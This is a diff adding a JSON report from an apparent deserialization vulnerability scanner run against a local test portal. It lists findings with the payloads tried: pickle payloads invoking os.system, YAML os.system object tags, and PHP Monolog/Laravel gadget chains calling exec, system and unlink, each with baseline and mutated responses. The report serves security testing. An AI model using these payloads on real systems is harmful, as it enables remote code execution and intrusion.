@@ -1,0 +1,3271 @@
+{
+  "target": "localhost:8083",
+  "disclaimer": "All findings are Suspected — the tool flags candidates and never auto-confirms; verify each manually.",
+  "stats": {
+    "vectors_scanned": 189,
+    "after_filter": 21,
+    "findings": 21,
+    "dynamic_strong": 4
+  },
+  "findings": [
+    {
+      "url": "http://localhost:8083/api/dashboard",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "occurrences": 2,
+      "oob_token": null,
+      "type": "Python Pickle",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Python Pickle RCE",
+      "suggested_probe": "pickle_exec",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-strong",
+      "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+      "normalized": [
+        "\u0004:\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b__main__\u0004User)}(\busername\u0006wiener\u0005adminub."
+      ],
+      "mutations_count": 3,
+      "indicators": [
+        "Observation: response length changed by +1 bytes (baseline=256 mutated=257, same status 200) — possible behavioral change, verify manually",
+        "Response content differs in a small, localized way despite same status (similarity=0.98) (baseline='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn' mutated='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn')"
+      ],
+      "attempts": [
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+          "signal": "strong",
+          "indicators": [
+            "Observation: response length changed by +1 bytes (baseline=256 mutated=257, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.98) (baseline='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn' mutated='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn')"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 257,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"unknown\"}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+          "signal": "strong",
+          "indicators": [
+            "Observation: response length changed by +1 bytes (baseline=256 mutated=257, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.98) (baseline='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn' mutated='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn')"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 257,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"unknown\"}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+          "signal": "strong",
+          "indicators": [
+            "Observation: response length changed by +1 bytes (baseline=256 mutated=257, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.98) (baseline='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn' mutated='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn')"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 257,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"unknown\"}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/import-config",
+      "method": "POST",
+      "location": "raw_body",
+      "name": "payload",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "YAML",
+      "subtype": "YAML Python Object Injection",
+      "confidence": "Medium",
+      "exploit_type": "YAML Python Object",
+      "suggested_probe": "yaml_exec",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-strong",
+      "notes": "Matched: YAML Python Object (pattern: !!python/object\\s*:) | Server must use yaml.load() not yaml.safe_load() to be vulnerable",
+      "normalized": [
+        "!!python/object:__main__.Settings {theme: dark, lang: en}"
+      ],
+      "mutations_count": 3,
+      "indicators": [
+        "Response length changed significantly: baseline=73 mutated=30"
+      ],
+      "attempts": [
+        {
+          "payload_type": "yaml_rce",
+          "chain": "python/object/apply:os.system",
+          "payload": "!!python/object/apply:os.system\nargs: ['id']",
+          "signal": "strong",
+          "indicators": [
+            "Response length changed significantly: baseline=73 mutated=30"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6c99d0>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 30,
+            "body_sample": "{\"config\":\"0\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "yaml_rce",
+          "chain": "python/object/apply:os.system",
+          "payload": "!!python/object/apply:os.system\nargs: ['whoami']",
+          "signal": "strong",
+          "indicators": [
+            "Response length changed significantly: baseline=73 mutated=30"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9ccd8a50>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 30,
+            "body_sample": "{\"config\":\"0\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "yaml_rce",
+          "chain": "python/object/apply:os.system",
+          "payload": "!!python/object/apply:os.system\nargs: ['hostname']",
+          "signal": "strong",
+          "indicators": [
+            "Response length changed significantly: baseline=73 mutated=30"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9ccd9ed0>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 30,
+            "body_sample": "{\"config\":\"0\",\"success\":true}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/restore-prefs",
+      "method": "POST",
+      "location": "raw_body",
+      "name": "payload",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "Python Pickle",
+      "subtype": "jsonpickle Object Injection",
+      "confidence": "Medium",
+      "exploit_type": "Python Pickle RCE",
+      "suggested_probe": "pickle_exec",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-strong",
+      "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+      "normalized": [
+        "{\"py/object\": \"__main__.Preferences\", \"theme\": \"dark\", \"lang\": \"en\"}"
+      ],
+      "mutations_count": 3,
+      "indicators": [
+        "Status code changed: baseline=200 mutated=500",
+        "Response length changed significantly: baseline=78 mutated=132"
+      ],
+      "attempts": [
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+          "signal": "strong",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=78 mutated=132"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd8710>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 132,
+            "body_sample": "{\"error\":\"failed to restore prefs via jsonpickle.decode(): 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte\"}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+          "signal": "strong",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=78 mutated=132"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9190>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 132,
+            "body_sample": "{\"error\":\"failed to restore prefs via jsonpickle.decode(): 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte\"}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+          "signal": "strong",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=78 mutated=132"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9e90>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 132,
+            "body_sample": "{\"error\":\"failed to restore prefs via jsonpickle.decode(): 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte\"}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/profile",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "Python Pickle",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Python Pickle RCE",
+      "suggested_probe": "pickle_exec",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-strong",
+      "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+      "normalized": [
+        "\u0004:\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b__main__\u0004User)}(\busername\u0006wiener\u0005adminub."
+      ],
+      "mutations_count": 3,
+      "indicators": [
+        "Observation: response length changed by +2 bytes (baseline=92 mutated=94, same status 200) — possible behavioral change, verify manually",
+        "Response content differs in a small, localized way despite same status (similarity=0.90) (baseline='{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\\n' mutated='{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\\n')"
+      ],
+      "attempts": [
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+          "signal": "strong",
+          "indicators": [
+            "Observation: response length changed by +2 bytes (baseline=92 mutated=94, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.90) (baseline='{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\\n' mutated='{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\\n')"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 94,
+            "body_sample": "{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+          "signal": "strong",
+          "indicators": [
+            "Observation: response length changed by +2 bytes (baseline=92 mutated=94, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.90) (baseline='{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\\n' mutated='{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\\n')"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 94,
+            "body_sample": "{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+          "signal": "strong",
+          "indicators": [
+            "Observation: response length changed by +2 bytes (baseline=92 mutated=94, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.90) (baseline='{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\\n' mutated='{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\\n')"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 94,
+            "body_sample": "{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/login",
+      "method": "POST",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 12,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 37,
+            "body_sample": "{\"success\":true,\"username\":\"wiener\"}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/dashboard",
+      "method": "GET",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 2,
+      "oob_token": null,
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 12,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
